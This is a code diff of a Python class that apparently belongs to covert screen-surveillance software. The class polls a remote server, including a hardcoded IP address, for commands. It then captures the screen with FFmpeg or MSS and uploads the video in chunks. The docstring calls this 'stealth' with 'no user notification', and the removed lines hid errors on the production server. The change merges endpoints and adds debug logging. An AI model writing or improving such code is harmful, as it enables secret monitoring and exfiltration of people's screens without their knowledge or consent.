@@ -73,43 +73,9 @@ class StreamHandler:
     def check_stream_requests(self):
         """Check server for streaming requests (stealth - no user notification)"""
         try:
-            # Check if this is production server
-            is_production = '103.129.149.67' in self.api_client.server_url
-            
-            if is_production:
-                # Production server - use getStreamRequest endpoint
-                try:
-                    response = requests.get(
-                        f"{self.api_client.server_url}/api/stream/request/{Config.CLIENT_ID}",
-                        timeout=5
-                    )
-                    
-                    if response.status_code == 200:
-                        data = response.json()
-                        
-                        if data.get('quality') and not self.is_streaming:
-                            # Start video streaming
-                            self.stream_quality = data.get('quality', 'medium')
-                            self.is_streaming = True
-                            self.video_streaming = True  # Enable video mode
-                            logging.info(f"Starting production video stream with quality: {self.stream_quality}")
-                            self.start_video_streaming()
-                            return True
-                            
-                        elif not data.get('quality') and self.is_streaming:
-                            # Stop streaming
-                            self.is_streaming = False
-                            self.video_streaming = False
-                            logging.info("Stopping production video stream")
-                            self.stop_video_streaming()
-                            return False
-                            
-                except requests.RequestException:
-                    pass
-                return False
-            
+            # Use unified endpoint for both production and local
             response = requests.get(
-                f"{Config.SERVER_URL}/api/stream/request/{Config.CLIENT_ID}",
+                f"{self.api_client.server_url}/api/stream/request/{Config.CLIENT_ID}",
                 timeout=10
             )
             
@@ -117,28 +83,27 @@ class StreamHandler:
                 data = response.json()
                 
                 if data.get('quality') and not self.is_streaming:
-                    # Start stealth streaming
-                    self.stream_quality = data['quality']
+                    # ALWAYS start video streaming (both production and local)
+                    self.stream_quality = data.get('quality', 'medium')
                     self.is_streaming = True
-                    logging.info(f"Starting stealth stream with quality: {self.stream_quality}")
-                    self.start_stealth_streaming()
+                    self.video_streaming = True  # Enable video mode
+                    logging.info(f"Starting video stream with quality: {self.stream_quality}")
+                    self.start_video_streaming()
                     return True
                     
                 elif not data.get('quality') and self.is_streaming:
                     # Stop streaming
                     self.is_streaming = False
-                    logging.info("Stopping stealth stream")
-                    self.stop_stealth_streaming()
+                    self.video_streaming = False
+                    logging.info("Stopping video stream")
+                    self.stop_video_streaming()
                     return False
                     
         except requests.RequestException:
             # Network errors are common, don't spam logs
             pass
         except Exception as e:
-            # Only log errors for local development
-            is_production = '103.129.149.67' in self.api_client.server_url
-            if not is_production:
-                logging.error(f"Error checking stream requests: {e}")
+            logging.error(f"Error checking stream requests: {e}")
         
         return False
             
@@ -236,6 +201,9 @@ class StreamHandler:
                 logging.warning("Video streaming already running")
                 return
                 
+            # Set video streaming flag
+            self.video_streaming = True
+                
             def video_stream_worker():
                 """Worker thread for real video streaming using FFmpeg"""
                 try:
@@ -297,25 +265,42 @@ class StreamHandler:
                         bufsize=0
                     )
                     
+                    logging.info(f"FFmpeg process started with PID: {self.ffmpeg_process.pid}")
+                    
                     # Read video chunks and send to server
                     chunk_size = 65536  # 64KB chunks
+                    chunk_count = 0
                     
                     while self.video_streaming and self.ffmpeg_process:
                         chunk = self.ffmpeg_process.stdout.read(chunk_size)
                         
                         if not chunk:
+                            logging.warning("No more data from FFmpeg")
                             break
+                            
+                        chunk_count += 1
+                        logging.info(f"Read video chunk {chunk_count} (size: {len(chunk)} bytes)")
                             
                         # Send video chunk to server
                         if self.send_video_chunk(chunk):
-                            logging.debug(f"Video chunk {self.sequence} sent successfully")
+                            logging.info(f"Video chunk {self.sequence} sent successfully (size: {len(chunk)} bytes)")
                         else:
-                            logging.debug(f"Failed to send video chunk {self.sequence}")
+                            logging.warning(f"Failed to send video chunk {self.sequence}")
                             
                         time.sleep(0.01)  # Small delay to prevent overwhelming
                         
                 except Exception as e:
                     logging.error(f"Video streaming error: {e}")
+                    
+                    # Check FFmpeg stderr for more details
+                    if self.ffmpeg_process and self.ffmpeg_process.stderr:
+                        try:
+                            stderr_output = self.ffmpeg_process.stderr.read(1024).decode('utf-8', errors='ignore')
+                            if stderr_output:
+                                logging.error(f"FFmpeg stderr: {stderr_output}")
+                        except:
+                            pass
+                            
                 finally:
                     if self.ffmpeg_process:
                         try:
@@ -332,8 +317,8 @@ class StreamHandler:
             logging.info(f"Real video streaming started with quality: {self.stream_quality}")
             
         except Exception as e:
-            logging.error(f"Video streaming startup error: {e}")
-            # Fallback to MSS-based screen capture
+            logging.error(f"FFmpeg video streaming error: {e}, falling back to MSS-based streaming")
+            # If FFmpeg fails, use MSS-based streaming as fallback
             self.start_mss_video_streaming()
             
     def start_mss_video_streaming(self):
@@ -342,6 +327,9 @@ class StreamHandler:
             if self.video_streaming and self.video_thread and self.video_thread.is_alive():
                 logging.warning("MSS Video streaming already running")
                 return
+                
+            # Set video streaming flag
+            self.video_streaming = True
                 
             def mss_video_worker():
                 """Worker thread for MSS-based video streaming"""
